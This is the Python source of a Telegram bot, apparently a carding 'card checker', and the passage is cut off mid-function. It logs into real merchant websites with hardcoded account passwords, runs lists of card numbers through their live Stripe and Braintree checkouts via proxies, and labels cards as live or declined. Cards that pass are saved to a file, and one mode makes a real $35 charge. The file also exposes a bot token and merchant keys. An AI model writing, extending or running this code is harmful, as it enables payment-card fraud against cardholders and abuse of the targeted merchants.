import os
import re
import time
import json
import asyncio
import base64
import random
from html import unescape
from bs4 import BeautifulSoup
import httpx
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

OWNER_ADMIN_ID = 7519839885
ADMIN_ID_FILE = "admin_ids.txt"
BOT_TOKEN = "8112017304:AAGsJv-F06cajaiSiho7x2SH_SUSdWOC7o0"
user_mode = "stripe"
proxy_list = []

def get_admin_chat_ids() -> set[int]:
    if os.path.exists(ADMIN_ID_FILE):
        with open(ADMIN_ID_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    return set()

def save_admin_chat_ids(admins: set[int]) -> None:
    with open(ADMIN_ID_FILE, "w") as f:
        for aid in admins:
            f.write(f"{aid}\n")

admin_chat_ids = get_admin_chat_ids()
active_mode_per_chat = {}

def gets(s: str, start: str, end: str) -> str | None:
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def validate_expiry_date(mes, ano):
    mes = mes.zfill(2)
    if len(ano) == 4:
        ano = ano[-2:]
    try:
        expiry_month = int(mes)
        expiry_year = int(ano)
    except ValueError:
        return False, "Invalid expiry date"
    current_year = int(time.strftime("%y"))
    current_month = int(time.strftime("%m"))
    if expiry_month < 1 or expiry_month > 12:
        return False, "Expiration date invalid"
    if expiry_year < current_year:
        return False, "Expiration date invalid"
    if expiry_year == current_year and expiry_month < current_month:
        return False, "Expiration date invalid"
    return True, ""

def is_valid_credit_card_number(number: str) -> bool:
    number = number.replace(" ", "").replace("-", "")
    if not number.isdigit():
        return False
    total = 0
    reverse_digits = number[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

def parse_fullz(fullz_raw):
    raws = re.split(r"\s+", fullz_raw.strip())
    cleaned = []
    for raw in raws:
        parts = raw.strip().split("|")
        if len(parts) != 4:
            continue
        cc, mes, ano, cvv = parts
        cc = re.sub(r"[^\d]", "", cc)
        mes = re.sub(r"[^\d]", "", mes)
        ano = re.sub(r"[^\d]", "", ano)
        cvv = re.sub(r"[^\d]", "", cvv)
        if len(ano) == 4:
            ano = ano[-2:]
        full = f"{cc}|{mes}|{ano}|{cvv}"
        cleaned.append(full)
    return cleaned

def load_proxies_from_file(file_path="proxy.txt"):
    proxies = []
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":")
                if len(parts) == 4:
                    host, port, user, pwd = parts
                    proxy_url = f"http://{user}:{pwd}@{host}:{port}"
                    proxies.append(proxy_url)
                else:
                    proxies.append(f"http://{line}")
    except FileNotFoundError:
        proxies = []
    return proxies

def save_proxies_to_file(proxies, file_path="proxy.txt"):
    lines = []
    for p in proxies:
        try:
            u = p[7:]
            userpass, hostport = u.split("@")
            user, pwd = userpass.split(":")
            host, port = hostport.split(":")
            line = f"{host}:{port}:{user}:{pwd}"
        except Exception:
            line = p
        lines.append(line)
    with open(file_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

# ---------------------- STRIPE AUTH (DARI SCRIPT ASLI) ----------------------
class StripeAuth:
    @staticmethod
    def gets(s: str, start: str, end: str) -> str | None:
        try:
            start_index = s.index(start) + len(start)
            end_index = s.index(end, start_index)
            return s[start_index:end_index]
        except ValueError:
            return None

    @staticmethod
    async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple[str, str, str, str]:
        try:
            cc, mes, ano, cvv = fullz.split("|")
            mes = mes.zfill(2)
            if len(ano) == 4:
                ano = ano[-2:]
            current_year = int(time.strftime("%y"))
            current_month = int(time.strftime("%m"))
            expiry_valid = True
            try:
                expiry_month = int(mes)
                expiry_year = int(ano)
                if expiry_month < 1 or expiry_month > 12 or expiry_year < current_year or (expiry_year == current_year and expiry_month < current_month):
                    expiry_valid = False
            except:
                expiry_valid = False
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
            }
            response = await session.get('https://elearntsg.com/login/', headers=headers)
            login = StripeAuth.gets(response.text, '"learndash-login-form" value="', '" />')
            if login is None:
                return "Login token not found ", '', '', ''
            headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://elearntsg.com',
                'Referer': 'https://elearntsg.com/login/',
            })
            data = {
                'learndash-login-form': login,
                'pmpro_login_form_used': '1',
                'log': 'rensen88@gmail.com',
                'pwd': 'Rensen88',
                'wp-submit': 'Log In',
                'redirect_to': '',
            }
            await session.post('https://elearntsg.com/wp-login.php', headers=headers, data=data)
            await session.get('https://elearntsg.com/activity-feed/', headers=headers)
            await session.get('https://elearntsg.com/my-account/payment-methods/', headers=headers)
            response = await session.get('https://elearntsg.com/my-account/add-payment-method/', headers=headers)
            nonce = StripeAuth.gets(response.text, '"add_card_nonce":"', '"')
            if nonce is None:
                return "Nonce token not found ", '', '', ''
            headers_api = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': headers['User-Agent'],
            }
            data_api = {
                'type':'card',
                'billing_details[name]':'rena senoman',
                'billing_details[email]':'rensen89@gmail.com',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mes,
                'card[exp_year]': ano,
                'guid':'e449b162-3515-4886-87fa-abb185bba5ef094143',
                'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',  # PERBAIKAN: ID yang benar
                'sid':'e111c2c6-927f-42ce-af16-8c70358cf59a6dea3e',
                'payment_user_agent':'stripe.js/4e21d61aa2; stripe-js-v3/4e21d61aa2; split-card-element',
                'referrer':'https://elearntsg.com',
                'time_on_page':'116734',
                'client_attribution_metadata[client_session_id]':'02c69dec-7a68-4d1c-96eb-00b43ee46be0',
                'client_attribution_metadata[merchant_integration_source]':'elements',
                'client_attribution_metadata[merchant_integration_subtype]':'card-element',
                'client_attribution_metadata[merchant_integration_version]':'2017',
                'key':'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
            }
            response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers_api, data=data_api)
            pm_json = response.json()
            try:
                id = pm_json.get('id')
                brand = pm_json.get('card', {}).get('brand', '')
                country = pm_json.get('card', {}).get('country', '')
                card_type = pm_json.get('card', {}).get('funding', '')
            except:
                return response.text, '', '', ''
            error_message = pm_json.get('error', {}).get('message', None)
            if not expiry_valid and error_message is None:
                error_message = "Expiration date invalid "
            if error_message:
                return error_message, country, brand, card_type
            headers_confirm = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://elearntsg.com',
                'Referer': 'https://elearntsg.com/my-account/add-payment-method/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': headers['User-Agent'],
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': headers['sec-ch-ua'],
                'sec-ch-ua-mobile': headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': headers['sec-ch-ua-platform'],
            }
            params_confirm = {'wc-ajax': 'wc_stripe_create_setup_intent'}
            data_confirm = {'stripe_source_id': id, 'nonce': nonce}
            response = await session.post('https://elearntsg.com/', params=params_confirm, headers=headers_confirm, data=data_confirm)
            return response.text, country, brand, card_type
        except Exception as e:
            return f"EXCEPTION: {str(e)}", '', '', ''

    @staticmethod
    async def charge_resp(result):
        try:
            if '{"status":"SUCCESS",' in result or '"status":"success"' in result:
                return "Approved ✅"
            elif "Thank you for your donation" in result:
                return "PAYMENT SUCCESSFUL! 🎉"
            elif "insufficient funds" in result:
                return "INSUFFICIENT FUNDS ✅"
            elif "incorrect_cvc" in result or "security code is incorrect" in result:
                return "CVV INCORRECT ❎"
            elif "transaction_not_allowed" in result:
                return "TRANSACTION NOT ALLOWED ❎"
            elif '"cvc_check": "pass"' in result:
                return "CVV MATCH ✅"
            elif "requires_action" in result:
                return "VERIFICATION 🚫"
            elif "three_d_secure_redirect" in result or "card_error_authentication_required" in result:
                return "3DS REQUIRED ❎"
            elif "Your card does not support this type of purchase." in result:
                return "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
            elif "generic_decline" in result:
                return "GENERIC DECLINED ❌"
            elif "do not honor" in result:
                return "DO NOT HONOR ❌"
            elif "fraudulent" in result:
                return "FRAUDULENT ❌"
            elif "invalid cvc" in result:
                return "INVALID CVV ❌"
            elif "stolen card" in result:
                return "STOLEN CARD ❌"
            elif "lost_card" in result:
                return "LOST CARD ❌"
            elif "pickup_card" in result:
                return "PICKUP CARD ❌"
            elif "incorrect_number" in result or "card number is incorrect" in result:
                return "INCORRECT CARD NUMBER ❌"
            elif "Your card has expired." in result:
                return "EXPIRED CARD ❌"
            elif "captcha" in result:
                return "CAPTCHA ❌"
            else:
                with open("result_logs.txt", "a", encoding="utf-8") as f:
                    f.write(result + "\n")
                return result + "❌"
        except Exception as e:
            return f"{str(e)} ❌"

    @staticmethod
    async def multi_checking(fullz: str) -> str:
        start = time.time()
        async with httpx.AsyncClient(timeout=40) as session:
            result, country, brand, card_type = await StripeAuth.create_payment_method(fullz, session)
            response = await StripeAuth.charge_resp(result)
        elapsed = round(time.time() - start, 2)
        try:
            json_resp = json.loads(result)
            if "error" in json_resp:
                error_message = unescape(json_resp["error"].get("message","")).strip()
                output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
                          f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
                          f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_message} ❌\n"
                          f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ {country}\n"
                          f"𝗕𝗿𝗮𝗻𝗱 ➯ {brand}\n"
                          f"𝗧𝘆𝗽𝗲 ➯ {card_type}\n")
                return output
        except:
            pass
        output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
                  f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
                  f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {response}\n"
                  f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ {country}\n"
                  f"𝗕𝗿𝗮𝗻𝗱 ➯ {brand}\n"
                  f"𝗧𝘆𝗽𝗲 ➯ {card_type}\n")
        if response in ["Approved ✅", "CVV INCORRECT ❎", "CVV MATCH ✅", "INSUFFICIENT FUNDS ✅"]:
            with open("auth.txt", "a", encoding="utf-8") as f:
                f.write(output + "\n")
        return output

    @staticmethod
    async def start_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        # Check if update is a CallbackQuery or regular Update
        if hasattr(update, 'callback_query'):
            chat_id = update.callback_query.from_user.id
        else:
            chat_id = update.effective_chat.id
        
        active_mode_per_chat[chat_id] = 'stripe'
        if hasattr(update, 'callback_query'):
            await update.callback_query.edit_message_text(
                "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV"
            )
        else:
            await update.message.reply_text(
                "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV"
            )

# ---------------------- STRIPE CHARGE (DARI SCRIPT BARU) ----------------------
class StripeCharge:
    @staticmethod
    async def create_payment_method(fullz, session):
        try:
            cc, mes, ano, cvv = fullz.split("|")
            user = "renasenon" + str(random.randint(9999, 574545))
            mail = "renasenon" + str(random.randint(9999, 574545)) + "@gmail.com"
            pwd = "renasenon" + str(random.randint(9999, 574545))
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://oncologymedicalphysics.com/membership-account/membership-levels/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            params = { 'level': '9' }
            response = await session.get(
                'https://oncologymedicalphysics.com/membership-account/membership-checkout/',
                params=params, headers=headers
            )
            nonce = gets(response.text, '<input type="hidden" id="pmpro_checkout_nonce" name="pmpro_checkout_nonce" value="', '" />')
            pk = gets(response.text, '"publishableKey":"', '",')
            acc = gets(response.text, '"user_id":"', '",')
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            data = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mes,
                'card[exp_year]': ano,
                'guid': '0aaa3729-fcc5-4958-8724-5641c9c28e9fc9f5e2',
                'muid': '4f5e7131-fe17-4aff-9855-af41b51290f9b1af17',
                'sid': '065f48c5-7e26-411e-b5a8-a055f6bb4293a28cde',
                'payment_user_agent': 'stripe.js/9c713d6d38; stripe-js-v3/9c713d6d38; split-card-element',
                'referrer': 'https://oncologymedicalphysics.com',
                'time_on_page': '118979',
                'client_attribution_metadata[client_session_id]': 'e3665829-eae0-46ad-b107-89c04e54004f',
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
                'client_attribution_metadata[merchant_integration_version]': '2017',
                'key': pk,
                '_stripe_account': acc,
            }
            response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            pm_json = response.json()
            id = pm_json.get('id')
            brand = pm_json.get('card', {}).get('brand', '')
            last4 = pm_json.get('card', {}).get('last4', '')
            country = pm_json.get('card', {}).get('country', '')
            card_type = pm_json.get('card', {}).get('funding', '')
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://oncologymedicalphysics.com',
                'priority': 'u=0, i',
                'referer': 'https://oncologymedicalphysics.com/membership-account/membership-checkout/?level=9',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            params = { 'level': '9' }
            data = {
                'pmpro_level': '9',
                'checkjavascript': '1',
                'pmpro_other_discount_code': '',
                'username': user,
                'password': pwd,
                'password2': pwd,
                'bemail': mail,
                'bconfirmemail': mail,
                'fullname': '',
                'CardType': brand,
                'pmpro_discount_code': '',
                'pmpro_checkout_nonce': nonce,
                '_wp_http_referer': '/membership-account/membership-checkout/?level=9',
                'submit-checkout': '1',
                'javascriptok': '1',
                'payment_method_id': id,
                'AccountNumber': f'XXXXXXXXXXXX{last4}',
                'ExpirationMonth': mes,
                'ExpirationYear': ano,
            }
            response = await session.post(
                'https://oncologymedicalphysics.com/membership-account/membership-checkout/',
                params=params,
                headers=headers,
                data=data,
            )
            return response.text, country, brand, card_type
        except Exception as e:
            return str(e), "", "", ""

    @staticmethod
    async def multi_checking(x, proxy=None):
        cc, mes, ano, cvv = x.split("|")
        async with httpx.AsyncClient(proxies=proxy, timeout=40) as session:
            result, country, brand, card_type = await StripeCharge.create_payment_method(x, session)
        
        card_info = (
            f"𝗖𝗮𝗿𝗱 ➯ <code>{x}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘\n"
            f"𝗕𝗿𝗮𝗻𝗱 ➯ {brand}\n"
            f"𝗧𝘆𝗽𝗲 ➯ {card_type}\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ {country}\n"
        )
        gateway = "𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘"
        if not is_valid_credit_card_number(cc):
            error_msg = "Incorrect card number ❌"
            return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_msg}"
        
        valid, err = validate_expiry_date(mes, ano)
        if not valid:
            error_msg = "Expiration date invalid ❌" if "Expiration" in err else err + " ❌"
            return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_msg}"
        
        error_message = ""
        response = ""
        try:
            html_content = result["html"] if isinstance(result, dict) else result
            json_resp = json.loads(html_content)
            if "error" in json_resp:
                raw_html = unescape(json_resp["error"].get("message", ""))
                soup = BeautifulSoup(raw_html, "html.parser")
                div = soup.find("div", class_="message-container")
                error_message = div.get_text(separator=" ", strip=True) if div else raw_html.strip()
        except Exception:
            try:
                html_for_parse = result["html"] if isinstance(result, dict) else result
                soup = BeautifulSoup(unescape(html_for_parse), "html.parser")
                error_div = soup.find('div', {'id': 'pmpro_message_bottom'})
                if error_div:
                    error_message = error_div.get_text(strip=True)
                else:
                    ul = soup.find("ul", class_="woocommerce-error")
                    li = ul.find("li") if ul else None
                    if li:
                        error_message = li.get_text(separator=" ", strip=True)
                    else:
                        div = soup.find("div", class_="message-container")
                        if div:
                            error_message = div.get_text(separator=" ", strip=True)
            except Exception:
                error_message = ""
        
        if "Reason: " in error_message:
            _, _, after = error_message.partition("Reason: ")
            error_message = after.strip()
        
        if "Payment method successfully added." in error_message:
            response = "Approved ✅"
            error_message = ""
        elif "Your card has insufficient funds." in error_message:
            response = "Insufficient Funds ❎"
            error_message = ""
        elif "Your card's security code is incorrect." in error_message or "Your card does not support this type of purchase." in error_message:
            response = "CCN LIVE ❎"
            error_message = ""
        elif "Customer authentication is required to complete this transaction." in error_message:
            response = "3D Challenge Required ❎"
            error_message = ""
        elif "Your card was declined." in error_message:
            response = "DECLINED ❌"
            error_message = ""
        elif "Invalid account." in error_message:
            response = "INVALID ACCOUNT ❌"
            error_message = ""
        elif "Your card number is incorrect." in error_message:
            response = "INCORRECT CARD NUMBER ❌"
            error_message = ""
        elif "Suspicious activity detected. Try again in a few minutes." in error_message:
            response = "TRY AGAIN LATER ❌"
            error_message = ""
        
        if error_message:
            return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_message}"
        elif response:
            return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {response}"
        else:
            return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ Charged $35"

    @staticmethod
    async def start_stripe_charge(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        # Check if update is a CallbackQuery or regular Update
        if hasattr(update, 'callback_query'):
            chat_id = update.callback_query.from_user.id
        else:
            chat_id = update.effective_chat.id
        
        active_mode_per_chat[chat_id] = 'stripe_charge'
        if hasattr(update, 'callback_query'):
            await update.callback_query.edit_message_text(
                "𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘\nSEND CARDS ➯ CC|MM|YY|CVV"
            )
        else:
            await update.message.reply_text(
                "𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘\nSEND CARDS ➯ CC|MM|YY|CVV"
            )

# ---------------------- BRAINTREE AUTH (DARI SCRIPT ASLI) ----------------------
class BraintreeAuth:
    @staticmethod
    def gets(s: str, start: str, end: str) -> str | None:
        try:
            start_index = s.index(start) + len(start)
            end_index = s.index(end, start_index)
            return s[start_index:end_index]
        except ValueError:
            return None

    @staticmethod
    def extract_braintree_token(response_text):
        pattern = r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]'
        match = re.search(pattern, response_text)
        if not match:
            return None
        token_base64 = match.group(1)
        try:
            decoded_json = base64.b64decode(token_base64).decode('utf-8')
            data = json.loads(decoded_json)
            return data
        except Exception as e:
            print(f"Error decoding or parsing JSON token: {e}")
            return None

    @staticmethod
    async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple[str, str, str, str, str]:
        try:
            cc, mes, ano, cvv = fullz.split("|")
            mes = mes.zfill(2)
            if len(ano) == 4:
                ano = ano[-2:]
            current_year = int(time.strftime("%y"))
            current_month = int(time.strftime("%m"))
            expiry_valid = True
            try:
                expiry_month = int(mes)
                expiry_year = int(ano)
                if expiry_month < 1 or expiry_month > 12 or expiry_year < current_year or (expiry_year == current_year and expiry_month < current_month):
                    expiry_valid = False
            except:
                expiry_valid = False
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'if-modified-since': 'Fri, 29 Aug 2025 04:27:39 GMT',
                'priority': 'u=0, i',
                'referer': 'https://boltlaundry.com/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            response = await session.get('https://boltlaundry.com/my-login/', headers=headers)
            login = BraintreeAuth.gets(response.text, '<input type="hidden" name="ihc_login_nonce" value="', '"')
            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://boltlaundry.com',
                'referer': 'https://boltlaundry.com/loginnow/',
            })
            data = {
                'ihcaction': 'login',
                'ihc_login_nonce': login,
                'log': 'senryjo',
                'pwd': 'Senryjoshua12',
            }
            await session.post('https://boltlaundry.com/my-login/', headers=headers, data=data)
            await session.get('https://boltlaundry.com/my-account/', headers=headers)
            await session.get('https://boltlaundry.com/my-account/payment-methods/', headers=headers)
            response = await session.get('https://boltlaundry.com/my-account/add-payment-method/', headers=headers)
            nonce = BraintreeAuth.gets(response.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
            token_data = BraintreeAuth.extract_braintree_token(response.text)
            if token_data is not None:
                authorization_fingerprint = token_data.get('authorizationFingerprint')
            headers_api = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': f'Bearer {authorization_fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'priority': 'u=1, i',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': '1434c429-71ba-4695-b174-a720a6f1fcc6',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv,
                            'billingAddress': {
                                'postalCode': '99518',
                                'streetAddress': '3228 Blackwell Street',
                            },
                        },
                        'options': {'validate': False}
                    }
                },
                'operationName': 'TokenizeCreditCard',
            }
            response = await session.post('https://payments.braintree-api.com/graphql', headers=headers_api, json=json_data)
            try:
                token = BraintreeAuth.gets(response.text, '"token":"', '"')
                brand = BraintreeAuth.gets(response.text, '"brandCode":"', '"')
                prepaid = BraintreeAuth.gets(response.text, '"prepaid":"', '"')
                bank = BraintreeAuth.gets(response.text, '"issuingBank":"', '"')
                country = BraintreeAuth.gets(response.text, '"countryOfIssuance":"', '"')
            except:
                return response.text, '', '', '', ''
            error_message = None
            try:
                json_resp = json.loads(response.text)
                if "error" in json_resp:
                    error_message = json_resp["error"].get('message', '')
            except:
                pass
            if not expiry_valid and error_message is None:
                error_message = "Expiration date invalid "
            if error_message:
                return error_message, country, brand, bank, prepaid
            headers_confirm = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://boltlaundry.com',
                'priority': 'u=0, i',
                'referer': 'https://boltlaundry.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            data_confirm = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': token,
                'braintree_cc_device_data': '',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/63cmb3nwbnpr3f9y/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/63cmb3nwbnpr3f9y"},"merchantId":"63cmb3nwbnpr3f9y","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Bolt Laundry service","clientId":"ARfb8y-TA8HEUbHMho8toQgfwE5E1QKIBZd6xsRaDVIyIBp0-Q6H2xr8VYa8FU57GUBPOZR__drnQcIe","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"boltlaundryservice_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
                'woocommerce-add-payment-method-nonce': nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
